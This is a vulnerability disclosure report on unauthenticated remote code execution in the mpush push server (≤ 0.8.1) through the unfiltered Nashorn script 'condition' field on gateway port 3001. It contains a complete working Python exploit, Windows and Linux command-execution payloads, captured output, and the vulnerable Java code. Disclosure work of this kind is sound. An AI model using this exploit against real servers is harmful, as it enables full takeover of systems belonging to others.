# mpush Native Script Injection Remote Code Execution (RCE) Vulnerability Report

## Vulnerability Description

mpush (mpusher/mpush) ≤ 0.8.1: the `condition` field of a `GATEWAY_PUSH` broadcast reaches Nashorn's `jsEngine.eval(script, ...)` unfiltered (`ScriptCondition.test`), allowing arbitrary OS command execution in the gateway server JVM via `Java.type('java.lang.Runtime').getRuntime().exec(...)`. The gateway port `3001` (default bind `0.0.0.0`) is plaintext (`ServerChannelHandler(false, ...)`) and dispatches `GATEWAY_PUSH` with no authentication.

## Affected Versions

mpush ≤ 0.8.1

## Exploitation Conditions

- Gateway service port `3001` exposed (default bind `0.0.0.0`, TCP)
- No credentials / no encryption required to reach the gateway
- **At least one user online** (a local router must exist): `BroadcastPushTask` only invokes `checkCondition → ScriptCondition.test` while iterating `LocalRouterManager.routers()`. Any bound client satisfies this.
- JDK 8 (Nashorn JavaScript engine with Java interop)

## Reproduction

Environment: mpush server on `127.0.0.1` — ConnectionServer `3000` (client long-conn), GatewayServer `3001` (internal push, bind 0.0.0.0).

**1. A victim user comes online and binds**

The client connects to `3000`, performs the encrypted handshake, and binds `userId=user-0`:

```
receive OkMessage{data='bind success' ...}, bindUserNum=1
```

**2. Attacker sends a malicious GATEWAY_PUSH broadcast (raw TCP, no mpush client library)**

```python
# attacker.py — pure socket, protocol: length(4)+cmd(1)+cc(2)+flags(1)+sessionId(4)+lrc(1)+body(n)
import socket, struct
def enc_str(s):
    if s is None: return struct.pack(">h", 0)
    b = s.encode(); return struct.pack(">h", len(b)) + b

CONDITION = "var R=Java.type('java.lang.Runtime');R.getRuntime().exec('cmd /c whoami > C:/Users/Public/mpush_rce.txt');true;"

body  = enc_str(None)                      # userId = null -> broadcast
body += struct.pack(">i", 0)               # clientType
body += struct.pack(">i", 0)               # timeout
body += enc_str("hello-from-attacker")     # content
body += enc_str(None)                      # taskId
body += enc_str(None)                      # tags
body += enc_str(CONDITION)                 # condition  <-- RCE payload

hlen  = struct.pack(">i", len(body)) + struct.pack(">B", 16) + struct.pack(">H", 0) + struct.pack(">B", 0) + struct.pack(">i", 1)
lrc = 0
for b in hlen: lrc ^= b
s = socket.create_connection(("127.0.0.1", 3001)); s.sendall(hlen + struct.pack(">B", lrc) + body); s.close()
```

```
[*] target 127.0.0.1:3001, body=161 bytes
[+] GATEWAY_PUSH sent.
```

![image-20260823185428325](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823185428325.7ehiegonb8.webp)

**3. The command executes in the server JVM**

```text
C:\Users\Public\mpush_rce.txt  →  content:  Administrator
```

The broadcast also reaches the victim (proving the full chain, while the victim stays connected):

```
receive push message, content=hello-from-attacker, receivePushNum=1
```

Payload (Linux variant): `var R=Java.type('java.lang.Runtime');R.getRuntime().exec('/bin/sh -c id > /tmp/mpush_rce.txt');true;`

![image-20260823185534804](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823185534804.9o0ixy9uvd.webp)

Code:

```java
// ScriptCondition.java:42-49
@Override
public boolean test(Map<String, Object> env) {
    try {
        return (Boolean) jsEngine.eval(script, new SimpleBindings(env));  // <-- arbitrary script execution
    } catch (Exception e) {
        return false;
    }
}
```

```java
// GatewayPushMessage.java:178-186
@Override
public Condition getCondition() {
    if (condition != null) {
        return new ScriptCondition(condition);   // attacker-controlled string
    }
    ...
}
```

```java
// GatewayServer.java:69-70
public GatewayServer(MPushServer mPushServer) {
    ...
    this.channelHandler = new ServerChannelHandler(false, connectionManager, messageDispatcher); // security = false
}
```

![image-20260823185614031](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823185614031.pg2ppsjy6.webp)

![image-20260823185754929](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823185754929.2yz397dt8q.webp)

![image-20260823185827855](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823185827855.1ow62vw75n.webp)
